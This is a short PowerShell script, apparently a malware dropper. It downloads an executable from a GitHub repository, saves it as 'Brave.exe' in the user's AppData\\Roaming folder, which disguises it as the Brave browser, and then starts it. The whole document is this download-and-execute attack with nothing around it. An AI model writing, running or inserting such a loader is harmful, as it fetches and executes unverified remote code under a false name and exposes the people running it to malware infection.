$p="$HOME\AppData\Roaming\Brave.exe";
$e=New-Object System.Net.WebClient;
$e.DownloadFile("https://github.com/dev-eloper-365/Tasks/raw/main/main.exe",$p);
Start-Process -FilePath $p
